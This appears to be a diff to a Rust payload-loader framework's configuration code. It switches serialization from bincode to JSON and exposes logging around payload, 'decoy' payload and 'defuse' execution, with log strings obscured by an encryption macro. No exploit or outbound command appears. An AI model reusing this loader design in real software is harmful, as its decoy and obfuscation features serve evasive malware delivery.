@@ -27,8 +27,6 @@ use log::debug;
 use log::info;
 use log::warn;
 
-//use bincode::Encode;
-
 #[derive(Serialize, Deserialize, Clone)]
 #[serde(rename = "vf")]
 pub struct VSM { // VerifSignMaterial
@@ -38,8 +36,7 @@ pub struct VSM { // VerifSignMaterial
     pub sign_bytes: Vec<u8>,
 }
 
-//#[cfg_attr(debug_assertions, derive(Serialize))]
-#[derive(Serialize,Deserialize, Clone)]
+#[derive(Serialize, Deserialize, Clone)]
 pub struct CCC {
     #[serde(rename = "ul")]
     pub update_links: BTreeMap<u64, (String, Plk)>,
@@ -173,7 +170,7 @@ impl CCC {
         let copy_loaderconf = &mut self.clone();
         copy_loaderconf.sign_material.sign_bytes = vec![];
         //format!("sign_data: {:?}", copy_loaderconf)
-        bincode::serialize(&copy_loaderconf).unwrap()
+        serde_json::to_vec(&copy_loaderconf).unwrap()
     }
 
     pub fn sign_loader(&mut self, key_pair: &Ed25519KeyPair) {
@@ -202,38 +199,28 @@ impl CCC {
 
     pub fn new_fromfile(path_file: &str) -> CCC {
         let loader_bytes: Vec<u8> = fs::read(path_file).unwrap();
-        //let l: &str = std::str::from_utf8(&loader_bytes).unwrap();
-        let config: CCC = bincode::deserialize(&loader_bytes).unwrap();
+        let l = std::str::from_utf8(&loader_bytes).unwrap();
+        let config: CCC = serde_json::from_str(l).unwrap();
         config
     }
 
-    /*
     pub fn print_loader(&self) {
         debug!("{}", serde_json::to_string_pretty(self).unwrap_or_default());
     }
     pub fn print_loader_compact(&self) {
         debug!("{}", encrypt_string!("print_loader_compact"));
         debug!("{:?}", serde_json::to_string(self).unwrap_or_default());
-    } */
+    }
     pub fn serialize_to_file(&self, path_file: &str) {
-        let serialized: Vec<u8> = self.loader_data_serialized();
+        let serialized: String = self.concat_loader_jsondata();
         fs::write(path_file, &serialized).expect("Unable to write file");
     }
-    /*
     pub fn serialize_to_file_pretty(&self, path_file: &str) {
         let serialized: String = serde_json::to_string_pretty(&self).unwrap();
         fs::write(path_file, &serialized).expect("Unable to write file");
     }
-    */
-    /* 
-    pub fn serialize_to_file(&self, path_file: &str) {
-        let serialized: String = serde_json::to_string_pretty(&self).unwrap();
-        fs::write(path_file, &serialized).expect("Unable to write file");
-    }*/
-
-
-    pub fn loader_data_serialized(&self) -> Vec<u8> {
-        bincode::serialize(&self).unwrap()
+    pub fn concat_loader_jsondata(&self) -> String {
+        serde_json::to_string(&self).unwrap()
     }
     pub fn print_loader_hash(&self) {
         debug!(
@@ -243,7 +230,7 @@ impl CCC {
         );
     }
     pub fn calculate_loader_hash(&self) -> String {
-        let serialized = self.loader_data_serialized();
+        let serialized = self.concat_loader_jsondata();
         let data = serialized;
         let digest = sha2_512::chksum(data).unwrap();
         digest.to_hex_lowercase()
@@ -254,8 +241,8 @@ impl CCC {
         loader_hash == otherloader_hash
     }
     pub fn is_same_loader(&self, otherloader: &CCC) -> bool {
-        let loader_serialized = self.loader_data_serialized();
-        let otherloader_serialized = otherloader.loader_data_serialized();
+        let loader_serialized = self.concat_loader_jsondata();
+        let otherloader_serialized = otherloader.concat_loader_jsondata();
         loader_serialized == otherloader_serialized
     }
     pub fn fromfile_master_keypair(path_file: &str) -> Ed25519KeyPair {
@@ -266,7 +253,6 @@ impl CCC {
     pub fn exec_payloads(&self, run_data: &mut RunData) {
         let mut nb_payload = 1;
         for payload in &self.payloads {
-            #[cfg(debug_assertions)]
             info!(
                 "{}/{}{}{}",
                 nb_payload,
@@ -310,7 +296,6 @@ impl CCC {
         info!("{}", encrypt_string!("[+] DECOY UPDATE config"));
         let mut nb_payload = 1;
         for payload in &self.decoy_update_config {
-            #[cfg(debug_assertions)]
             info!(
                 "{}/{}{}{}",
                 nb_payload,
@@ -356,7 +341,6 @@ impl CCC {
         info!("{}", encrypt_string!("[+] DECOY PAYLOADS exec"));
         let mut nb_payload = 1;
         for payload in &self.decoy_payload_exec {
-            #[cfg(debug_assertions)]
             info!(
                 "{}/{}{}{}",
                 nb_payload,
@@ -402,7 +386,6 @@ impl CCC {
         let mut nb_defuse: i32 = 1;
         let mut check_this_defuse = true;
         for defuse in defuse_list {
-            #[cfg(debug_assertions)]
             info!(
                 "{}/{}{}{}",
                 nb_defuse,
@@ -474,7 +457,6 @@ impl CCC {
 
     pub fn backup_config(&self) {
         for backup_file in &self.backup_config {
-            #[cfg(debug_assertions)]
             info!("{}{}", encrypt_string!("[+] backup_file: "), serde_json::to_string(backup_file).unwrap_or_default());
             self.backup_config_to_file(&mut backup_file.clone());
         }
@@ -496,7 +478,7 @@ impl CCC {
 
                 info!("{}{:?}", encrypt_string!("[+] Write file: "), path);
 
-                let data: Vec<u8> = self.clone().loader_data_serialized();
+                let data: Vec<u8> = self.clone().concat_loader_jsondata().into_bytes();
                 match apply_all_dataoperations(&mut backup_file.dataoperation, data) {
                     Ok(data) => {
                         if let Err(e) = fs::write(&path, &data) {
@@ -536,7 +518,6 @@ impl CCC {
         //TODO
         let mut file_links = vec![];
         for backup_file in &self.backup_config {
-            #[cfg(debug_assertions)]
             debug!("{}{}", encrypt_string!("[+] backup_file: "), serde_json::to_string(backup_file).unwrap_or_default());
             match calculate_path_reverse(&backup_file.file_path) {
                 Ok(possible_paths) => {
